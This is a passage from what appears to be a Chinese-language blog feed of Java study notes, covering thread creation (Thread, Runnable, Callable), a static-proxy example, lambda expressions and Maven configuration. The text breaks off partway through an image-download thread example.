class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">100</span>;i++)&#123;<br>            <span class="hljs-comment">//模拟兔子休息</span><br>            <span class="hljs-keyword">if</span>(Thread.currentThread().getName().equals(<span class="hljs-string">&quot;兔子&quot;</span>)&amp;&amp;i%<span class="hljs-number">20</span>==<span class="hljs-number">19</span>)&#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    Thread.sleep(<span class="hljs-number">1</span>);<br>                &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>            System.out.println(Thread.currentThread().getName()+<span class="hljs-string">&quot;跑了&quot;</span>+i+<span class="hljs-string">&quot;m&quot;</span>);<br>            <span class="hljs-keyword">boolean</span> flag=gameOver(i);<br>            <span class="hljs-keyword">if</span>(flag)&#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//判断是否完成比赛</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">gameOver</span><span class="hljs-params">(<span class="hljs-keyword">int</span> steps)</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(winner!=<span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (steps&gt;=<span class="hljs-number">99</span>)&#123;<br>                winner=Thread.currentThread().getName();<br>                System.out.println(winner+<span class="hljs-string">&quot;获胜&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Race race=<span class="hljs-keyword">new</span> Race();<br>        <span class="hljs-keyword">new</span> Thread(race,<span class="hljs-string">&quot;兔子&quot;</span>).start();<br>        <span class="hljs-keyword">new</span> Thread(race,<span class="hljs-string">&quot;乌龟&quot;</span>).start();<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="实现Callable接口"><a href="#实现Callable接口" class="headerlink" title="实现Callable接口"></a>实现Callable接口</h2><ol><li>实现Callable接口，需要返回值类型</li><li>重写call方法，需要抛出异常</li><li>创建目标对象</li><li>创建执行服务: ExecutorService ser =Executors.newFixedThreadPool(1);</li><li>提交执行: Future<Boolean> result1 = ser. submit(t1);</li><li>获取结果: boolean r1 = result1.get()</li><li>关闭服务: ser.shutdownNow();</li></ol><p>案例</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ll.多线程;<br><br><span class="hljs-keyword">import</span> java.util.Random;<br><span class="hljs-keyword">import</span> java.util.concurrent.*;<br><br><span class="hljs-comment">//线程创建方式三 实现Callable接口</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo3</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Callable</span>&lt;<span class="hljs-title">Boolean</span>&gt; </span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Boolean <span class="hljs-title">call</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Random random=<span class="hljs-keyword">new</span> Random();<br><br>        <span class="hljs-keyword">if</span>(random.nextInt()%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ExecutionException, InterruptedException </span>&#123;<br>        Demo3 text_1=<span class="hljs-keyword">new</span> Demo3();<br>        Demo3 text_2=<span class="hljs-keyword">new</span> Demo3();<br>        Demo3 text_3=<span class="hljs-keyword">new</span> Demo3();<br>        <span class="hljs-comment">//创建执行服务</span><br>        ExecutorService ser= Executors.newFixedThreadPool(<span class="hljs-number">3</span>);<br><br>        <span class="hljs-comment">//提交执行:</span><br>        Future&lt;Boolean&gt; result1 = ser. submit(text_1);<br>        Future&lt;Boolean&gt; result2 = ser. submit(text_2);<br>        Future&lt;Boolean&gt; result3 = ser. submit(text_3);<br>        <span class="hljs-comment">//获取结果:</span><br>        <span class="hljs-keyword">boolean</span> r1 = result1.get();<br>        <span class="hljs-keyword">boolean</span> r2 = result2.get();<br>        <span class="hljs-keyword">boolean</span> r3 = result3.get();<br>        System.out.println(r1);<br>        System.out.println(r2);<br>        System.out.println(r3);<br>        <span class="hljs-comment">//关闭服务:</span><br>        ser.shutdownNow();<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>好处：</p><ol><li>可以提交返回值</li></ol><h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>案例</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ll.多线程;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StaticProxy</span> </span>&#123;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        WeddingCompang weddingCompang=<span class="hljs-keyword">new</span> WeddingCompang(<span class="hljs-keyword">new</span> You());<br>        weddingCompang.HappyMarry();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Marry</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">HappyMarry</span><span class="hljs-params">()</span></span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">You</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Marry</span></span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">HappyMarry</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;结婚是喜事&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WeddingCompang</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Marry</span></span>&#123;<br>    <span class="hljs-keyword">private</span> Marry target;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">WeddingCompang</span><span class="hljs-params">(Marry target)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.target=target;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">HappyMarry</span><span class="hljs-params">()</span> </span>&#123;<br>        before();<br>        <span class="hljs-keyword">this</span>.target.HappyMarry();<br>        after();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">before</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;帮助完成&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">after</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;收取尾款&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>静态代理模式总结：</p><ul><li>真实对象和代理对象都要实现同一个接口</li><li>代理对象要代理真实角色</li></ul><p>好处：</p><ul><li>代理对象可以做很多真实对象做不了的事情</li><li>真实对象专注做自己的事情</li></ul><p>改良后的具有多线程</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">new</span> Thread(()-&gt; System.out.println(<span class="hljs-string">&quot;爱你&quot;</span>)).start();<br><br><span class="hljs-keyword">new</span> WeddingCompang(<span class="hljs-keyword">new</span> You()).HappyMarry();<br></code></pre></div></td></tr></table></figure><h2 id="Lamda-表达式"><a href="#Lamda-表达式" class="headerlink" title="Lamda 表达式"></a>Lamda 表达式</h2><ul><li><p>λ希腊字母表中排序第十-位的字母，英语名称为Lambda</p></li><li><p>避免匿名内部类定义过多</p></li><li><p>其实质属于函数式编程的概念<br>(params) -&gt; expression [表达式]<br>(params) -&gt; statement [语句]<br>(params) -&gt; { statements }</p><p>a-&gt; System. out.println(“i like lambda–&gt;”+a) ;<br>new Thread (()-&gt;System.out.println(“多线程学习。”)) .start();</p></li></ul><p>函数式接口的定义:</p><ul><li>任何接口，如果只包含唯一一个抽象方法, 那么它就是一个函数式接口。<br>public interface Runnable {<div class="hljs code-wrapper"><pre><code>public abstract void run();</code></pre></div>}</li><li>对于函数式接口，我们可以通过lambda表达式来创建该接口的对象。</li></ul><p>相关代码</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lambda</span> </span>&#123;<br>    <span class="hljs-comment">//3.静态内部类</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ilike2</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Like</span></span>&#123;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">lambda</span><span class="hljs-params">()</span> </span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;I Like JAVA2&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Like like=<span class="hljs-keyword">new</span> Ilike();<br>        like.lambda();<br><br>        like=<span class="hljs-keyword">new</span> Ilike2();<br>        like.lambda();<br><br><br><br>        <span class="hljs-comment">//4.局部内部类</span><br>        <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ilike3</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Like</span></span>&#123;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">lambda</span><span class="hljs-params">()</span> </span>&#123;<br>                System.out.println(<span class="hljs-string">&quot;I Like JAVA3&quot;</span>);<br>            &#125;<br>        &#125;<br><br>        like=<span class="hljs-keyword">new</span> Ilike3();<br>        like.lambda();<br>        <span class="hljs-comment">//5.匿名内部类 没有类名称，必须借助接口或者父类</span><br>        like=<span class="hljs-keyword">new</span> Like()&#123;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">lambda</span><span class="hljs-params">()</span> </span>&#123;<br>                System.out.println(<span class="hljs-string">&quot;I Like JAVA4&quot;</span>);<br>            &#125;<br>        &#125;;<br>        like.lambda();<br><br>        <span class="hljs-comment">//6.用lamda简化</span><br>        like=()-&gt;&#123;<br>            System.out.println(<span class="hljs-string">&quot;I Like JAVA5&quot;</span>);<br>        &#125;;<br>        like.lambda();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//1.定义一个函数式接口</span><br><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Like</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">lambda</span><span class="hljs-params">()</span></span>;<br>&#125;<br><br><span class="hljs-comment">//2.实现类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ilike</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Like</span></span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">lambda</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;I Like JAVA&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>带参数的</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lamda</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Test tmp = (<span class="hljs-keyword">int</span> n) -&gt; &#123;<br>            System.out.println(n);<br>        &#125;;<br>        tmp.tmp(<span class="hljs-number">234</span>);<br>        <span class="hljs-comment">//进一步简化</span><br>        tmp=(n)-&gt;&#123;<br>            System.out.println(n);<br>        &#125;;<br>        tmp.tmp(<span class="hljs-number">234</span>);<br>        <span class="hljs-comment">//进一步简化</span><br>        tmp=n -&gt; &#123;<br>            System.out.println(n);<br>        &#125;;<br>        tmp.tmp(<span class="hljs-number">234</span>);<br>        <span class="hljs-comment">//进一步简化</span><br>        tmp=n -&gt;System.out.println(n);<br>        <span class="hljs-comment">//总结：lamda表达式只能有一行代码的情况下才能简化为一行如果有多行，那么就用代码块包裹</span><br>        <span class="hljs-comment">//前提是接口为函数式接口</span><br>        <span class="hljs-comment">//多个参数也可以去掉参数类型，（必须全写或都不写参数类型）必须加上括号</span><br>        tmp.tmp(<span class="hljs-number">234</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">tmp</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span></span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java JavaBase</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java_base_maven</title>
    <link href="/2021/04/05/Java/JavaBase/java_base_maven/"/>
    <url>/2021/04/05/Java/JavaBase/java_base_maven/</url>
    
    <content type="html"><![CDATA[<h1 id="Maven学习"><a href="#Maven学习" class="headerlink" title="Maven学习"></a>Maven学习</h1><p>项目架构管理工具</p><p>自动导入和配置jar包</p><p>核心思想：<strong>约定大于配置</strong></p><ul><li>有约束，不要违反</li></ul><p>Maven会规定好你该如何去编写我们的java代码，必须要按照这个规范操作</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>配置环境</p><p>M2_HOME:%MAVEN_HOME%\bin</p><p>MAVEN_HOME:D:\maven\apache-maven-3.6.3</p><p>Path %MAVEN_HOME%\bin</p><p>mvn -version</p><p>修改配置文件</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">   <span class="hljs-comment">&lt;!-- setting.xml --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mirror</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>nexus-aliyun<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mirrorOf</span>&gt;</span>*,!jeecg,!jeecg-snapshots<span class="hljs-tag">&lt;/<span class="hljs-name">mirrorOf</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Nexus aliyun<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>https://maven.aliyun.com/repository/public <span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">mirror</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">localRepository</span>&gt;</span>D:\maven\apache-maven-3.6.3\maven-repo<span class="hljs-tag">&lt;/<span class="hljs-name">localRepository</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p><strong>本地仓库</strong></p><p><strong>远程仓库</strong></p><h2 id="在IDEA中使用Maven"><a href="#在IDEA中使用Maven" class="headerlink" title="在IDEA中使用Maven"></a>在IDEA中使用Maven</h2><ol><li>创建一个Maven</li><li>Create from archetype 可以使用Maven的模板</li><li>设置编写的setting文件</li><li>等待初始化完毕</li><li>仓库多了很多对象</li><li>IDEA中配置Maven<br>注意:经常在IDEA中会出现一个问题，就是项目自动创建完成后,它这个MavenHome会使用IDEA默认，我们如果发现了这个问题，手动改为本地的</li><li>pom.xml是核心文件</li><li>由于maven约定大于配置，可能我们写的配置文件无法导出或无效使用，解决方法在build中配置resources，来防止我们的资源到处失败的问题</li></ol><p>Maven创建普通项目</p>]]></content>
    
    
    <categories>
      
      <category>Java JavaBase</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>Maven</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java_base_多线程_1</title>
    <link href="/2021/04/05/Java/JavaBase/java_base_%E5%A4%9A%E7%BA%BF%E7%A8%8B_1/"/>
    <url>/2021/04/05/Java/JavaBase/java_base_%E5%A4%9A%E7%BA%BF%E7%A8%8B_1/</url>
    
    <content type="html"><![CDATA[<h1 id="多线程学习——-1"><a href="#多线程学习——-1" class="headerlink" title="多线程学习—— 1"></a>多线程学习—— 1</h1><h2 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h2><ul><li>线程就是独立的执行路径;</li><li>在程序运行时，即使没有自己创建线程，后台也会有多个线程，如主线程，gc线程;</li><li>main()称之为主线程，为系统的入口，用于执行整个程序;</li><li>在一个进程中，如果开辟了多个线程，线程的运行由调度器安排调度，调度器是与操作系统紧密相关的，先后顺序是不能认为的干预的。</li><li>对同一份资源操作时，会存在资源抢夺的问题，需要加入并发控制;</li><li>线程会带来额外的开销，如cpu调度时间，并发控制开销。</li><li>每个线程在自己的工作内存交互，内存控制不当会造成数据不一致</li></ul><h2 id="Process与Thread"><a href="#Process与Thread" class="headerlink" title="Process与Thread"></a>Process与Thread</h2><ul><li>说起进程，就不得不说下程序。程序是指令和数据的有序集合，其本身没有任何运行的含义，是一个静态的概念。</li><li>而进程则是执行程序的一次执行过程，它是一个动态的概念。是系统资源分配的单位</li><li>通常在一个进程中可以包含若干个线程，当然一个进程中至少有一个线程，不然没有存在的意义。线程是CPU调度和执行的的单位。</li><li>注意:很多多线程是模拟出来的，真正的多线程是指有多个cpu，即多核，如服务器。如果是模拟出来的多线程，即在一个cpu的情况下，在同一个时间点，cpu只能执行一个代码，因为切换的很快，所以就有同时执行的错局</li></ul><h2 id="线程创建的方式"><a href="#线程创建的方式" class="headerlink" title="线程创建的方式"></a>线程创建的方式</h2><ol><li>Thread class 继承</li><li>Runnable 接口 实现接口</li><li>Callable 接口 实现接口</li></ol><h3 id="Thread-继承"><a href="#Thread-继承" class="headerlink" title="Thread 继承"></a>Thread 继承</h3><p>Thread_lean.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ll.javalearn.多线程;<br><br><span class="hljs-comment">//继承Thread 重写run()方法 调用start开启线程</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Thread_learn</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Thread</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">200</span>;i++)&#123;<br>            System.out.println(<span class="hljs-string">&quot;run:&quot;</span>+i);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-comment">//主线程</span><br>        <span class="hljs-comment">//创建一个线程对象</span><br>        Thread_learn test1=<span class="hljs-keyword">new</span> Thread_learn();<br>        <span class="hljs-comment">//调用start（）开始方法</span><br>        test1.start();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">200</span>;i++)&#123;<br>            System.out.println(<span class="hljs-string">&quot;main:&quot;</span>+i);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>总结;线程开启不一定立即执行，由CPU调度</p><p>Demo.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo1</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Thread</span></span>&#123;<br>    <span class="hljs-keyword">private</span> String url;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Demo1</span><span class="hljs-params">(String url, String name)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.name=name;<br>        <span class="hljs-keyword">this</span>.url=url;<br>    &#125;<br><br>    <span class="hljs-comment">//下载图片线程的执行体</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>        WebDownloader webDownloader=<span class="hljs-keyword">new</span> WebDownloader();<br>        <span class="hljs-keyword">try</span> &#123;<br>            webDownloader.downloader(url,name);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;下载的文件名为：&quot;</span>+name);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Demo1 tmp_1=<span class="hljs-keyword">new</span> Demo1(<span 